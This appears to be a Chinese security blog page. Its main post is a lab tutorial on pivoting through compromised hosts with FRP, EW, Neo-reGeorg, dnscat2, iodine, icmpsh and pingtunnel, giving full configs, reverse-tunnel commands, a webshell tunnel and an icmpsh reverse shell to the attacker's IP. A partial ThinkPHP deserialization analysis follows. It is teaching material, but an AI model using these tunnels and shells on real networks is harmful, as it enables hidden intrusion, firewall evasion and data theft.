<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247488874&idx=1&sn=5c2961b213b5b0743ff7d665c2845443&chksm=c172cf76f6054660c69e7838f34d141064f309206def00e66a354590fe56ce32d1f4ff38364d&mpshare=1&scene=23&srcid=0310JucKxdBxjgbDz6XjbQIE&sharer_sharetime=1646877301325&sharer_shareid=79f27f6e56ba23e3a1134e77ab528270#rd">域渗透之委派攻击详解</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">
                内网渗透篇-隧道代理
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2022-02-24</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>什么是隧道？</strong></p>
<p>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</p>
<p>在后渗透过程中，往往会遇到许多不出网主机。那么如何让我们可以访问到这些不出网的主机，然后进行内网的攻击从而进一步扩大战果，就需要利用到隧道代理了。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>攻击机kali    192.168.80.131(出网网段)
沦陷机器win10 192.168.80.130 | 192.168.88.140
内网机器win8  192.168.88.130 | 192.168.146.130</code></pre>
<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>代理：中转站，把不出网的机器的流量通过中转站和攻击机进行交互。</p>
<p>端口转发：A端口流量转到B端口，A为新开，B为本就存在，对应关系为一对一</p>
<p>正向代理：主动连接，Client去连接Server的行为</p>
<p>反向代理：被动连接，Server去连接Client的行为</p>
<h2 id="常规代理转发隧道"><a href="#常规代理转发隧道" class="headerlink" title="常规代理转发隧道"></a>常规代理转发隧道</h2><p>​    -FRP隧道</p>
<p>​    -EW隧道</p>
<p>​    -SSH隧道</p>
<p>​    -DNS隧道</p>
<p>​    -ICMP隧道</p>
<p>​    -HTTP/HTTPS隧道</p>
<h2 id="代理转发隧道选择"><a href="#代理转发隧道选择" class="headerlink" title="代理转发隧道选择"></a>代理转发隧道选择</h2><p>主要基于两点：一：出网协议；二：出网端口；根据边界机器支持的出网协议和出网端口来选择到底使用什么代理转发隧道，例如果边界机器协议都支持，那么可以可以自由选择，如果边界机器只支持ICMP协议，那么只能选择ICMP协议做代理转发隧道。</p>
<p>判断机器出网协议：</p>
<pre><code>1.ICMP 
ping www.baidu.com
2.TCP  
nc -n IP por
3.HTTP 
curl IP:port   
4.DNS  
Windwos:
 nslookup www.baidu.com vps-ip
 nslookup www.baidu.com     // 不指定服务器，则使用默认的DNS服务器
Linux:
 dig @vps-ip www.baidu.com
 dig www.baidu.com          // 不指定服务器，则使用默认的DNS服务器</code></pre>
<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 等协议。相比于EW更稳定，FRP分服务端和客户端，服务端放攻击者公网VPS，客户端放受害者边界机器，由于是反向代理，顾边界机器需能访问到攻击机。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<h4 id="单级代理"><a href="#单级代理" class="headerlink" title="单级代理"></a><strong>单级代理</strong></h4><p><strong>frp服务端的配置</strong></p>
<pre><code>frps.ini
[common]
bind_port = 7000
vhost_https_port = 8001        #当代理出来的是web服务时，在外网访问http://vps的IP:7001[实战中可以⽤⼀些通透性较好的端⼝]
#dashboard_port状态以及代理统计信息展示,网址:7500可查看详情
dashboard_port = 7500
#dashboard_user访问用户dashboard_pwd访问密码
dashboard_user = admin
dashboard_pwd = admin</code></pre>
<p>启动服务端</p>
<pre><code>linux    nohup ./frps -c frps.ini
windows  frps.exe -c frps.ini</code></pre>
<p><img src="/images/234.png"></p>
<p>访问<a href="http://127.0.0.1:7500查看frp是否成功运行">http://127.0.0.1:7500查看frp是否成功运行</a></p>
<p><img src="/images/235.png"></p>
<p>填入上面配置时设置了用户名和密码： dashboard_user = admin dashboard_pwd = admin，输入配置的密码就行了。</p>
<p>如图正常运行</p>
<p><img src="/images/236.png"></p>
<p><strong>frp客户端配置</strong></p>
<pre><code>frpc.ini
[common]
#frp服务端IP或域名 [实战中⼀般都会直接⽤域名]
server_addr = VPS-IP
#frp服务器端⼝
server_port = 8001
#启⽤加密 [通信内容加密传输，有效防⽌流量被拦截]
use_encryption = true
#启⽤压缩 [传输内容进⾏压缩，有效减⼩传输的⽹络流量，加快流量转发速度，但会额外消耗⼀些CPU资源]
use_compression = true
#内⽹穿透通常⽤socks5
[socks5]
type = tcp
#连接VPS内⽹穿透的远程连接端⼝
remote_port = 9066
#使⽤插件socks5代理
plugin = socks5
#socks5连接⼝令 [根据实际情况进⾏配置]
plugin_user = admin
plugin_passwd = admin</code></pre>
<p>启动客户端</p>
<pre><code>linux   nohup ./frpc -c ./frpc.ini
windows frpc.exe -c frpc.ini</code></pre>
<p><img src="/images/237.png"></p>
<p><strong>查看frp服务端是否有客户端连接成功</strong></p>
<p>成功连接</p>
<p><img src="/images/238.png"></p>
<p><strong>利用代理攻击目标内网</strong></p>
<p>浏览器配置代理</p>
<p><img src="/images/239.png"></p>
<p><strong>访问内网机器服务</strong></p>
<p><img src="/images/240.png"></p>
<h4 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a><strong>多级代理</strong></h4><pre><code>概述：kali启动frps.exe与win10用户启动frpc.exe连接，完成一级代理。win10用户启动frps.exe与win8用户启动frpc.exe连接，完成二级代理。更多级类似，就不做阐述。</code></pre>
<p><strong>kali服务端配置</strong></p>
<pre><code>frps.ini
[common]
bind_port = 8001
bind_addr = 0.0.0.0
dashboard_port = 7500
dashboard_user = admin
dashboard_pwd = admin</code></pre>
<p><strong>win10客户端配置</strong></p>
<pre><code>[common]
server_addr = 192.168.80.131
server_port = 8001

[plugin_socks]
type = tcp
local_ip = 192.168.88.140
local_port = 1080
remote_port = 9066
plugin = socks5
use_encryption = true
use_compression = true
plugin_user = admin
plugin_passwd = admin123</code></pre>
<p>测试一级连通性，按照上面单级代理那样。</p>
<p><img src="/images/241.png"></p>
<p>进行二级代理配置</p>
<p><strong>win10服务端配置</strong></p>
<pre><code>[common]
bind_port = 8001
bind_addr = 0.0.0.0</code></pre>
<p><strong>win8客户端配置</strong></p>
<pre><code>[common]
server_addr = 192.168.88.140
server_port = 8001

[plugin_socks]
type = tcp
remote_port = 1080
plugin = socks5
use_encryption = true
use_compression = true
plugin_user = admin
plugin_passwd = admin123</code></pre>
<p>测试多级联通性，原来的代理设置不需要更改。</p>
<p><img src="/images/242.png"></p>
<p><strong>更多使用方法参考官方文档</strong></p>
<p><a target="_blank" rel="noopener" href="https://gofrp.org/docs/examples/">https://gofrp.org/docs/examples/</a></p>
<h3 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h3><p>老牌代理转发工具，支持端口转发和socks5代理，但因为年代久远和使用的广泛度，已被各种AV标记严重，所以利用该工具进行代理转发需要进行工具的免杀。</p>
<p><strong>ew有六种模式，分别是：</strong></p>
<ul>
<li>ssocksd </li>
<li>rcsocks </li>
<li>rssocks </li>
<li>lcx_slave </li>
<li>lcx_listen </li>
<li>lcx_tran </li>
</ul>
<p>ssocksd是用于普通网络环境下的正向连接。 </p>
<p>rcsocks 和 rssocks 用于反向连接。</p>
<p>lcx_slave 、lcx_listen 和 lcx_tran 用于复杂网络环境的多级连接。 </p>
<p><strong>常用参数</strong> </p>
<p>-l：指定要监听的本地端口 </p>
<p>-d：指定要反弹到的机器 ip </p>
<p>-e：指定要反弹到的机器端口 </p>
<p>-f：指定要主动连接的机器 ip </p>
<p>-g：指定要主动连接的机器端口 </p>
<p>-t：指定超时时长,默认为 1000</p>
<h4 id="单级代理-1"><a href="#单级代理-1" class="headerlink" title="单级代理"></a>单级代理</h4><h5 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h5><p><img src="/images/243.png"></p>
<p><strong>在win10执行</strong></p>
<pre><code>ew_for_Win.exe -s ssocksd -l 1080</code></pre>
<p><strong>编辑kali /etc/proxychains4.conf</strong></p>
<pre><code>socks5 192.168.80.130 1080</code></pre>
<p><strong>nmap</strong></p>
<pre><code>nmap -sT -Pn 192.168.88.130</code></pre>
<h5 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h5><p><img src="/images/244.png"></p>
<p><strong>先在kali执行</strong></p>
<pre><code>./ew_for_linux64 -s rcsocks -l 1080 -e 10808 </code></pre>
<p><strong>然后在win10执行</strong></p>
<pre><code>ew_for_Win.exe -s rssocks -d 192.168.80.131 -e 10808</code></pre>
<p><strong>编辑kali /etc/proxychains4.conf</strong></p>
<pre><code>socks5 127.0.0.1 1080</code></pre>
<p><strong>nmap</strong></p>
<pre><code>nmap -sT -Pn 192.168.88.130</code></pre>
<h4 id="多级代理-1"><a href="#多级代理-1" class="headerlink" title="多级代理"></a>多级代理</h4><h5 id="正向代理-1"><a href="#正向代理-1" class="headerlink" title="正向代理"></a>正向代理</h5><p><img src="/images/245.png"></p>
<p><strong>先在win8(C)上启动socks5代理服务</strong></p>
<pre><code>ew_for_Win.exe -s ssocksd -l 1080</code></pre>
<p><strong>再在win10(B)上设置端口转发</strong></p>
<p>ew_for_Win.exe -s lcx_tran -l 监听端口 -f 指定得内网地址 -g 内网某服务端口</p>
<pre><code>ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.88.130 -g 1080</code></pre>
<p><strong>编辑kali /etc/proxychains4.conf</strong></p>
<pre><code>socks5 192.168.80.130 1080</code></pre>
<p><strong>nmap</strong></p>
<pre><code>nmap -sT -Pn 192.168.146.130</code></pre>
<h5 id="反向代理-1"><a href="#反向代理-1" class="headerlink" title="反向代理"></a>反向代理</h5><p><img src="/images/246.png"></p>
<p><strong>先在kali(A)执行</strong></p>
<pre><code>./ew_for_linux64 -s rcsocks -l 1080 -e 10808 </code></pre>
<p><strong>然后在win10(B)执行</strong></p>
<pre><code>ew_for_Win.exe -s lcx_slave -d 192.168.80.131 -e 10808 -f 192.168.88.130 -g 10808</code></pre>
<p><strong>最后在win8(C)执行</strong></p>
<pre><code>ew_for_Win.exe -s ssocksd -l 10808</code></pre>
<p><strong>编辑kali /etc/proxychains4.conf</strong></p>
<pre><code>socks5 127.0.0.1 1080</code></pre>
<p><strong>nmap</strong></p>
<pre><code>nmap -sT -Pn 192.168.146.130</code></pre>
<p><strong>更多级类似，最内层开启代理，其他层进行转发</strong></p>
<h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><p>Neo-reGeorg是常见的HTTP正向隧道工具，是reGeorg工具的升级版。</p>
<ul>
<li>提高 tunnel 连接安全性</li>
<li>提高可用性，避免特征检测</li>
<li>提高传输内容保密性</li>
<li>应对更多的网络环境场景</li>
<li>稳定性好</li>
<li>端口复用</li>
</ul>
<p>下载地址</p>
<p><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
<h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><ul>
<li><strong>Step 1.</strong> 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器</li>
</ul>
<pre><code>$ python3 neoreg.py generate -k password

    [+] Create neoreg server files:
       =&gt; neoreg_servers/tunnel.jspx
       =&gt; neoreg_servers/tunnel_compatibility.jspx
       =&gt; neoreg_servers/tunnel.php
       =&gt; neoreg_servers/tunnel.ashx
       =&gt; neoreg_servers/tunnel.aspx
       =&gt; neoreg_servers/tunnel.jsp
       =&gt; neoreg_servers/tunnel_compatibility.jsp</code></pre>
<ul>
<li><strong>Step 2.</strong> 使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理</li>
</ul>
<pre><code>$ python3 neoreg.py -k password -u http://xx/tunnel.php
+------------------------------------------------------------------------+
  Log Level set to [DEBUG]
  Starting socks server [127.0.0.1:1080]
  Tunnel at:
    http://xx/tunnel.php
+------------------------------------------------------------------------+</code></pre>
<p>然后就是常规的代理设置访问了。</p>
<h2 id="常规隧道介绍"><a href="#常规隧道介绍" class="headerlink" title="常规隧道介绍"></a>常规隧道介绍</h2><h3 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h3><p><strong>什么是DNS隧道？</strong></p>
<p>DNS隧道(DNS Tunneling)是将其他协议的内容封装在DNS协议中，然后以DNS请求和响应包完成传输数据(通信)的技术。当前网络世界中的DNS是一项必不可少的服务，所以防火墙和入侵检测设备处于可用性和用户友好的考虑大都不会过滤DNS流量，也为DNS成为隐蔽信道创造了条件，因此，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。</p>
<p><strong>DNS隧道的原理：</strong></p>
<p>DNS隧道，是隧道技术中的一种。DNS隧道很难防范，因为平时的业务也好，使用也罢，难免会用到DNS协议进行解析，所以防火墙大多对DNS的流量是放行状态。这时候，如果我们在边界机器构造一个恶意的域名（*.test.cn），本地的DNS服务器无法给出回答时，就会以迭代查询的方式通过互联网定位到所查询域的权威DNS服务器。最后，这条DNS请求会落到我们提前搭建好的恶意DNS服务器上。</p>
<p><strong>适用环境</strong></p>
<p>当我们的http、socks、tcp这样的协议、正反向端口转发都失败的时候，可以尝试使用DNS隧道。</p>
<p><strong>DNS隧道技术实现</strong>：</p>
<p>建立DNS隧道之前首先要准备公网VPS和域名。</p>
<p><strong>查看DNS协议是否可以通信</strong></p>
<pre><code>Windwos : nslookup domain
Linux   : dig domain</code></pre>
<p><strong>部署域名解析</strong></p>
<p>上腾讯云购买个便宜的域名和具有公网IP的VPS</p>
<p>在域名DNS解析上添加以下两条记录</p>
<p>A记录：用于描述域名到IP地址的映射关系</p>
<p>NS记录：用于指定该域名由哪个DNS服务器来进行解析</p>
<p><img src="/images/249.png"></p>
<p>第一条A类记录，告诉域名系统，”dns.xxx.com”的IP地址是”139.xxx.xxx.xxx”</p>
<p>第二条NS记录，告诉域名系统，”dns2tcp.xxx.com”的域名由”dns.xxx.com”进行解析。</p>
<p>最后这条”dns2tcp.xxx.com”的DNS就会被”139.xxx.xxx.xxx”的主机(也就是我们的VPS)，给解析掉。</p>
<h4 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h4><p><strong>Ubuntu安装dnscat2（服务端）</strong></p>
<pre><code>apt-get install gem
apt-get install  ruby-dev
apt-get install libpq-dev
apt-get install ruby-bundler

apt-get install git
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
bundle init
bundle install</code></pre>
<p><strong>启动服务端</strong></p>
<pre><code> ruby ./dnscat2.rb dns2tcp.hackby.site -e open -c 123456 --no-cache</code></pre>
<p>-c : 定义了“pre-shared secret”，可以使用具有预共享密钥的身份验证机制来防止中间人攻击。否则，因为传输的数据并未加密，所以可能被监听网络流量的第三方还原。如果不定义此参数，dnscat2会生成一个随机字符串（将其复制下来，在启动客户端时需要使用它）</p>
<p>-e : 规定安全级别。“open”表示服务端允许客户端不进行加密</p>
<p>–no-cache : 禁止缓存。务必在运行服务器时添加该选项，因为powershell-dnscat2客户端与dnscat2服务器的Caching模式不兼容</p>
<p><strong>启动客户端</strong></p>
<pre><code>linux:
git clone https://github.com/iagox86/dnscat2
cd dnscat2/client/
make

windows:
#测试是否能够通信dnscat2-v0.07-client-win64.exe --ping dns2tcp.hackby    
#连接服务端，secret后为设置的密码
dnscat2-v0.07-client-win64.exe --dns domain=dns2tcp.hackby.site --secret=123456   </code></pre>
<p>下载地址：<a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a></p>
<p>客户端返回如下，则建立连接成功</p>
<p><img src="/images/247.png"></p>
<p><strong>dnscat2常用命令</strong></p>
<pre><code>sessions    查看会话
session -i 1 进入1会话
shell    打开另一个会话，进入交互模式
help    查看帮助
download    下载
ping    
suspend    返回上一层
upload
shutdown    切断但钱会话
quit    退出dnscat2控制台
kill    切断通道</code></pre>
<p><img src="/images/248.png"></p>
<h4 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h4><p>iodine可以通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。iodine是基于C语言开发的，分为<strong>服务端程序iodined</strong>和<strong>客户端程序iodine</strong>。kali中内置了iodine。</p>
<p>iodine相对于dnscat2来说，速度和稳定性都是在dnscat2之上的。</p>
<p><strong>安装iodine</strong></p>
<pre><code>apt install iodine</code></pre>
<p><strong>服务端运行</strong></p>
<pre><code>iodined -f -c -P d1m0n 192.168.0.1 dns2tcp.xxx.com -DD</code></pre>
<pre><code>-f：在前台运行
-c：禁止检查所有传入请求的客户端IP地址。
-P：客户端和服务端之间用于验证身份的密码。
-D：指定调试级别，-DD指第二级。“D”的数量随级别增加。
这里的192.168.0.1为自定义局域网虚拟IP地址，建议不要与现有网段冲突
注意！填写的地址为NS记录</code></pre>
<p><img src="/images/250.png"></p>
<p>完成基本配置后，可以通过iodine检查页面（<a target="_blank" rel="noopener" href="https://code.kryo.se/iodine/check-it%EF%BC%89%E6%A3%80%E6%9F%A5%E9%85%8D%E7%BD%AE%E6%98%AF%E5%90%A6%E6%AD%A3%E7%A1%AE">https://code.kryo.se/iodine/check-it）检查配置是否正确</a></p>
<p><img src="/images/251.png"></p>
<p><strong>客户端运行</strong></p>
<h5 id="目标为Linux"><a href="#目标为Linux" class="headerlink" title="目标为Linux"></a><strong>目标为Linux</strong></h5><pre><code>iodine -f -P d1m0n dns2tcp.xxx.com -M 200 </code></pre>
<pre><code>-r：iodine有时会自动将DNS隧道切换为UDP隧道，该参数的作用是强制在任何情况下使用DNS隧道
-M：指定上行主机的大小。
-m：调节最大下行分片的大小。
-f：在前台运行
-T：指定DNS请求类型TYPE，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A。
-O：指定数据编码规范。
-P：客户端和服务端之间用于验证身份的密码。
-L：指定是否开启懒惰模式，默认开启。
-I：指定两个请求之间的时间间隔。</code></pre>
<p><img src="/images/252.png"></p>
<p>查看客户端网卡信息，发现多了一块dns0虚拟网卡</p>
<p><img src="/images/253.png"></p>
<p><strong>使用DNS隧道</strong></p>
<p><strong>服务端新起一个终端，连接失陷主机</strong></p>
<p><img src="/images/254.png"></p>
<p>或者利用SSH协议进行内网穿透代理，SSH通常都用来登录远程主机，传输的内容全部经过加密处理，同样它内置了命令可以作为代理服务器使用。</p>
<p><strong>失陷主机执行以下命令</strong></p>
<pre><code>ssh -N -D 8080 root@192.168.0.1</code></pre>
<pre><code>-N 指示SSH不要启动shell，因为我们只是想创建代理
-D 设置动态端口转发，SOCKS代理端口为8080</code></pre>
<p>输入完VPS的ssh密码之后，就开始进行转发</p>
<p><strong>攻击机配置proxychains代理</strong></p>
<p><img src="/images/255.png"></p>
<p>然后就是继续渗透了！</p>
<h5 id="目标为Windows"><a href="#目标为Windows" class="headerlink" title="目标为Windows"></a><strong>目标为Windows</strong></h5><p>条件：同时需要安装TAP网卡驱动程序。也可以下载OpenVPN，在安装时仅选择TAP-Win32驱动程序，安装后服务器上就会多出一块“TAP-Wndows ADApter V9”的网卡。</p>
<p><img src="/images/256.png"></p>
<p>工具地址：<a target="_blank" rel="noopener" href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a></p>
<p>运行客户端程序iodine，如果出现提示“Connection setup complete, transmitting data”，就表示DNS隧道已经建立。</p>
<pre><code>iodine.exe -f -P d1m0n dns2tcp.xxx.com -M 200</code></pre>
<p><img src="/images/257.png"></p>
<p>通过在客户端执行”ping 192.168.0.1”命令，来测试连通性。</p>
<p><strong>使用DNS隧道</strong></p>
<p>由于客户端和服务器在同一个局域网中，只要直接访问即可。例如，登录目标主机的3389端口，就可以直接执行”rdesktop 192.168.0.2:3389”命令。同样，目标主机也可以通过SSH进行登录服务器。</p>
<h3 id="HTTP隧道"><a href="#HTTP隧道" class="headerlink" title="HTTP隧道"></a>HTTP隧道</h3><p>通过HTTP协议与代理服务器建立连接，把所有要传送的数据全部封装到HTTP协议里进行传送。用于绕过IDS、Firewall一类的安全设备限制和只允许web服务和外界通信，可以实现端口复用的好处。常常用于内网里面的端口转发与流量代理,由于HTTP通信流量往往与正常流量差异较少一般不容易被检测出来。</p>
<p><strong>适用环境</strong></p>
<p>获取webshell的主机位于内网，并且该内网主机的icmp、dns、tcp和udp协议等都不能出网。</p>
<p><strong>工具介绍</strong></p>
<p>Neo-reGeorg,为reGeorg的升级版，且传输内容经过了base64编码，避免特征检查，有效绕过检测。(稳定性好)</p>
<p>工具地址以及如何使用上面介绍该工具的时候已经说明了。</p>
<h3 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h3><p>ICMP隧道是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为Ping命令的回复，攻击者可以利用命令得到比回复更多的ICMP请求。在通常情况下，每个Ping命令都有相对应的回复与请求。</p>
<p>在一些条件下，如果攻击者使用各类隧道技术（HTTP，DNS，常规正反端口转发等）操作都失败了，常常会通过ping命令访问远程计算机，尝试进行ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙（通常防火墙不会屏蔽ping数据包），实现不受限制的网络访问。</p>
<h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><ul>
<li>icmpsh的优点是在目标机器上运行时不需要管理员权限</li>
<li>客户端目标只能是Windows</li>
</ul>
<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
<p><strong>服务端安装</strong></p>
<p>需要先安装python impacket</p>
<pre><code>git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
python2 setup.py install</code></pre>
<p><strong>安装icmpsh</strong></p>
<pre><code>git clone https://github.com/inquisb/icmpsh.git</code></pre>
<p>在使用icmpsh前需要先禁用对ping的响应回复，防止内核对ping数据包进行响应，影响程序。（用完再改成0）</p>
<pre><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></pre>
<p><strong>服务端开启监听</strong></p>
<pre><code>python2 icmpsh_m.py attackIP targetIP
python2 icmpsh_m.py 192.168.80.131 192.168.80.130</code></pre>
<p><img src="/images/258.png"></p>
<p><strong>客户端运行</strong></p>
<pre><code>icmpsh.exe -t attackIP
icmpsh.exe -t 192.168.80.131</code></pre>
<p><img src="/images/259.png"></p>
<p><strong>接收shell</strong></p>
<p><img src="/images/260.png"></p>
<h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
<ul>
<li>在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件</li>
<li>客户端执行需要管理员权限</li>
</ul>
<p><strong>攻击机服务端执行</strong></p>
<pre><code>./ew_for_linux64 -s rcsocks -l 1080 -e 10808</code></pre>
<p>将10808收到的流量转发至1080端口</p>
<p>然后执行pingtunnel</p>
<pre><code>./pingtunnel -type server </code></pre>
<p><strong>沦陷机器客户端执行</strong></p>
<pre><code>pingtunnel.exe -type client -l 127.0.0.1:1080 -s 192.168.80.131 -t 192.168.80.131:10808 -sock5 -1 -noprint 1 -nolog 1</code></pre>
<p>然后执行ew</p>
<pre><code>ew_for_Win.exe -s rssocks -d 127.0.0.1 -e 1080</code></pre>
<p><strong>隧道搭建成功</strong></p>
<p><img src="/images/261.png"></p>
<p><img src="/images/262.png"></p>
<p>配置隧道代理进行内网渗透</p>
<p><img src="/images/263.png"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NTU0Nzk5MQ==&mid=2247483919&idx=1&sn=abd02476fb2c90dbc0d7ac01793936ed&chksm=ce5921b7f92ea8a10b389fafb874c085d3b880341bb0566956f64bcf6782d31d35a6fe355ab5&mpshare=1&scene=23&srcid=0224YjZAuT5UGNty9otMFZgL&sharer_sharetime=1645691464210&sharer_shareid=79f27f6e56ba23e3a1134e77ab528270#rd">代理转发隧道技术</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/284740.html">内网隐藏通信隧道技术——DNS隧道</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120030588">内网渗透之DNS隧道</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
                Thinkphp6.0.12LTS反序列化漏洞分析
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2022-02-20</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/321546.html">首发于Freebuf安全社区</a></p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Thinkphp6.0.12LTS(目前最新版本)</p>
<p>PHP7.3.4</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code>composer create-project topthink/think tp6</code></pre>
<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p><img src="/images/216.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞起点不是<code>__desturct</code>就是<code>__wakeup</code>全局搜索下，起点在<code>vendor\topthink\think-orm\src\Model.php</code></p>
<p>只要把<code>this-&gt;lazySave</code>设为<code>True</code>,就会调用了<code>save</code>方法</p>
<p><img src="/images/217.png"></p>
<p>跟进<code>save</code>方法，漏洞方法是<code>updateData</code>，但需要绕过①且让②为<code>True</code>,①调用<code>isEmpty</code>方法</p>
<p><img src="/images/218.png"></p>
<pre><code>public function save(array $data = [], string $sequence = null): bool
    &#123;
        // 数据对象赋值
        $this-&gt;setAttrs($data);
        if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) &#123;
            return false;
        &#125;

        $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);</code></pre>
<p>跟进<code>isEmpty</code>方法,只要<code>$this-&gt;data</code>不为空就行。</p>
<p><img src="/images/219.png"></p>
<p><code>$this-&gt;trigger</code>方法默认返回就不是<code>false</code>，跟进<code>updateData</code>方法。漏洞方法是<code>checkAllowFields</code>默认就会触发。</p>
<p><img src="/images/220.png"></p>
<pre><code>protected function updateData(): bool
    &#123;
        // 事件回调
        if (false === $this-&gt;trigger(&#39;BeforeUpdate&#39;)) &#123;
            return false;
        &#125;

        $this-&gt;checkData();

        // 获取有更新的数据
        $data = $this-&gt;getChangedData();

        if (empty($data)) &#123;
            // 关联更新
            if (!empty($this-&gt;relationWrite)) &#123;
                $this-&gt;autoRelationUpdate();
            &#125;

            return true;
        &#125;

        if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime) &#123;
            // 自动写入更新时间
            $data[$this-&gt;updateTime]       = $this-&gt;autoWriteTimestamp();
            $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime];
        &#125;

        // 检查允许字段
        $allowFields = $this-&gt;checkAllowFields();</code></pre>
<p>跟进<code>checkAllowFields</code>方法，漏洞方法是<code>db</code>，默认也是会触发该方法，继续跟进。</p>
<p><img src="/images/221.png"></p>
<pre><code>    protected function checkAllowFields(): array
    &#123;
        // 检测字段
        if (empty($this-&gt;field)) &#123;
            if (!empty($this-&gt;schema)) &#123;
                $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));
            &#125; else &#123;
                $query = $this-&gt;db();</code></pre>
<p>跟进<code>db</code>方法，存在<code>$this-&gt;table . $this-&gt;suffix</code>字符串拼接，可以触发<code>__toString</code>魔术方法，把<code>$this-&gt;table</code>设为触发<code>__toString</code>类即可。</p>
<p><img src="/images/222.png"></p>
<pre><code>public function db($scope = []): Query
    &#123;
        /** @var Query $query */
        $query = self::$db-&gt;connect($this-&gt;connection)
            -&gt;name($this-&gt;name . $this-&gt;suffix)
            -&gt;pk($this-&gt;pk);

        if (!empty($this-&gt;table)) &#123;
            $query-&gt;table($this-&gt;table . $this-&gt;suffix);
        &#125;</code></pre>
<p>全局搜索<code>__toString</code>方法，最后选择<code>vendor\topthink\think-orm\src\model\concern\Conversion.php</code>类中的<code>__toString</code>方法。</p>
<p>跟进<code>__toString</code>方法，调用了<code>toJson</code>方法。</p>
<p><img src="/images/223.png"></p>
<p>跟进<code>toJson</code>方法，调用了<code>toArray</code>方法，然后以JSON格式返回。</p>
<p><img src="/images/224.png"></p>
